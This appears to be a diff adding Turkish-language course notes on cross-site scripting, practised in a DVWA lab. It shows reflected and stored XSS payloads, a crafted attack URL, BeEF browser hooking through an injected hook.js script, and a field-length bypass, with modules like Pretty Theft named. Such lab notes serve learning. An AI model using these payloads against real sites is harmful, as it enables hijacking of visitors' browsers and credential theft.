@@ -1,0 +1,52 @@
+	XSS [Cross Site Scripting]
+ O web sitesine javascript kodu koymaya olanak tanıyor.
+ Bir siteye javascrip kodu enjekte edildiğinde o siteye giren tüm kullanıcılara erişim sağlayabiliriz.
+ Bu sebeple XSS Açıkları çok tehlikeli ve bir o kadar da güçlüdür.
+
+ Metasploitable Sanal Makinemizi açtıktan sonra Kali içerisinde:
+ Firefox > 10.0.2.4/ > DVWA
+
+
+
+  URL ile XSS
+ XSS reflected	-> JS Kodumuzu URL içine enjekte ettiğimizde bir kişiye zarar vermek, bilgisayarını ele geçirmek istiyorsak o kişinin bu linke tıklaması gerekecek.
+ Bulduğumuz forma javascript kodu enjekte ediyoruz.
+
+ <script>alert("i hack you")</script>	-> Çalıştırdığımızda site kullanıcıya "i hack you" alert'i gönderir.
+
+ Aşağıda verildiği gibi sitenin oluşturduğu link adresini başka birisine çalıştırabilirsek o da "i hack you" alerti alır.
+ http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22i+hack+you%22%29%3C%2Fscript%3E#
+
+
+
+
+  Kayıtlı XSS
+ XS stored	-> Javascript kodumuzu veritabanına, websitesi içerisine saklayacağız.
+		-> Böylelikle bu sayfaya giren herkesin cihazında js kodumuz çalışır hale gelecektir.
+ Eğer sitede stored xss açığı var ise "message" kısmına bir <script> yazabiliriz.
+ <script>alert("i hack you")</script>	-> Böylelikle bu sitenin "XSS stored" arayüzüne giren Herkesin cihazında JS kodumuz çalışabilir hale geldi.
+
+
+
+
+  XSS ile Gerçek Hacking Deneyimi
+ Bunun için BeEF aracını kullanacağız.
+ Terminal
+ beef-xss	-> Açılan bencerede verilen linke giderek BeEF arayüzüne girebiliriz.
+ Terminal üzerinden BeEF'in bize verdiği kodu kopyalayıp sitenin message kısmına yapıştırıyoruz.
+
+ <script src="http://127.0.0.1:3000/hook.js"></script>
+
+ Fakat sitenin message kısmında karakter sınırlaması olduğu için kodun tamamı yazılmadı.
+ Böyle bir durumda şunu yapmalıyız: Right Click > Inspect Element > Burada message kutusunun özelliklerini bulup maxlength kısmını değiştirmemiz gerekiyor.
+ Tekrardan kodu yazıp, Sign Guestbook çalıştırırsam BeEF üzerinden siteye girenleri hook etmiş olacağız.
+  Spyder eye, Alert, Pretty Theft, Fake Notification Bar -> Gibi komutlar çalıştırabilirsiniz.
+
+
+
+
+  XSS'den Nasıl Korunurum?
+ Rastgele ve tanımadığın kişilerden gelen maillere itibare etme.
+ Stored XSS'den korunmak için JS kodlarını çalıştırmayı engelleyebiliriz:
+ Google > Settings > Advanced > Privacy and security > Content settings > JavaScript -> change for "Blocked"
+ tamamen tehlikeli sitelerde gezineceksek tamamını "blocked" edip güvendiğimiz siteleri "allowed" içerisine kendimiz manuel olarak site ekleyebiliriz.
